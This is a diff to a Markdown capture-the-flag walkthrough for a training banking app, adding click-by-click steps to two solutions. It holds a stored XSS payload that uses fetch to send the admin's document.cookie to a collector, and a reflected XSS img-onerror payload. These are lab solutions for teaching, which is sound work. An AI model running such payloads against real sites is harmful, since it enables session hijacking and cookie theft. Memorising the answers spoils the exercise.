@@ -214,14 +214,19 @@ That is the canonical XSS cookie-theft one-liner:
 ```html
 <script>fetch('/w1-03/collect/demoTOK?c='+document.cookie)</script>
 ```
-- Put it in the note, submit → *"Transfer #20 created"*.
-- Your collector **before** reporting → `/w1-03/collect/demoTOK` (or `/collector`
-  → enter `demoTOK`) → empty.
-- Click **Report to admin**.
-- Your collector **after** → real captured value:
+**In the browser, exactly:**
+1. Open **New transfer**. In the **Note** field paste the payload — use *your own*
+   token, and use the **same** string in the payload and when you check the
+   collector (here `demoTOK`).
+2. Send the transfer → click **Report to admin for review**.
+3. Open `/w1-03/collect/demoTOK` (or go to **/collector** and type `demoTOK`).
+   Empty before you reported; after reporting it holds the stolen cookie:
 ```
 session=admin-danubka; flag=RPC{...}
 ```
+⚠️ Nothing appears in *your* own page when the payload runs — it runs in the
+**admin's** browser, not yours. The collector is the only place you see the result.
+
 **Reason.** The callback fired only after the admin "viewed" the note → your script
 executed **in the admin's browser** → stored XSS confirmed, and the exfiltrated
 cookie carries the flag. Had the note been escaped, the collector would stay empty.
@@ -271,6 +276,17 @@ page* by an executed script. That forces a genuine XSS, not a guessed request.
 ```html
 <img src=x onerror="fetch('/search/solved?n='+window.__proof)">
 ```
+
+**In the browser, exactly:**
+1. Log into the bank, open **Search**.
+2. Paste the payload above into the search box and submit.
+3. The page comes back showing your payload — **no flag yet. This is normal.** The
+   `<img>` fails to load → its `onerror` runs your JS → which quietly calls
+   `/search/solved` with the page's token. (Open DevTools → Network to watch that
+   request go out and return the flag.)
+4. **Reload `/search`** (just open it again) → **now the flag appears.**
+   ⚠️ This is the step people miss: the flag shows on the *next* page load, not
+   the one you injected into (that request happened before your script solved it).
 
 **Impact.** Arbitrary JS in a victim's authenticated session (cookie theft, actions
 on their behalf), delivered by a crafted URL.
